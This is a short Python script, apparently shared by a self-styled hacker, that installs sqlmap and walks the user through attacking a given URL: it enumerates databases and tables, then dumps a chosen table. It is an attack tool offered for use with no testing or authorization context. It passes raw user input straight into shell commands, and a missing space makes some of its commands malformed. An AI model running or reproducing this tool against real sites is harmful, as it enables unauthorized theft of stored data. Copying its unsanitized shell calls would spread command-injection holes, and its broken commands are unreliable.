#insta : 7snhacker
import os
ii = os.system('apt-get install sqlmap -y')
runn = os.system('sqlmap')
print("""
███████╗███████╗███╗   ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
╚════██║██╔════╝████╗  ██║██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██╔╝███████╗██╔██╗ ██║███████║███████║██║     █████╔╝ █████╗  ██████╔╝
   ██╔╝ ╚════██║██║╚██╗██║██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
   ██║  ███████║██║ ╚████║██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
   ╚═╝  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝                                                                                                      
""")
a = input("the link : ")
sqll = os.system('sqlmap -u '+a+ " --dbs --batch")
d = input("database name : ")
dat = os.system('sqlmap -u '+a+ "-D "+d+ " --tables --batch")
tt = input("the table : ")
table = os.system('sqlmap -u '+a+ "-D "+d+ " -T "+tt+ " --dump --batch")																								
											
							
	
		
		
									
											
